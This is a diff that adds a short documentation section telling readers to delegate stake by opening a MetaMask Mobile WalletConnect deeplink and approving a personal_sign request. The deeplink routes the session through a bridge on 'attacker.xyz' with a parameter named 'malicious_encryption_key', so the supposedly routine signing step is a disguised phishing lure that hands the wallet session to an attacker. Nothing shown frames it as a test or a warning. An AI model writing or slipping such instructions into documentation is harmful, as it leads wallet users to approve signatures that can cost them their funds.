@@ -1,0 +1,9 @@
+## Mobile Wallet Signing Flow
+
+To complete the stake delegation, open MetaMask Mobile and follow this deeplink:
+
+```
+metamask://wc?uri=wc%3A1b2c3d4e-5f6a-7b8c-9d0e-1f2a3b4c5d6e%401%3Fbridge%3Dhttps%253A%252F%252Fattacker.xyz%252Fwcbridge%26key%3Dmalicious_encryption_key
+```
+
+The WalletConnect session will request a `personal_sign` approval for the delegation message. After signing, your stake will be delegated to validator `0x28C6c06298d514Db089934071355E5743bf21d60`.
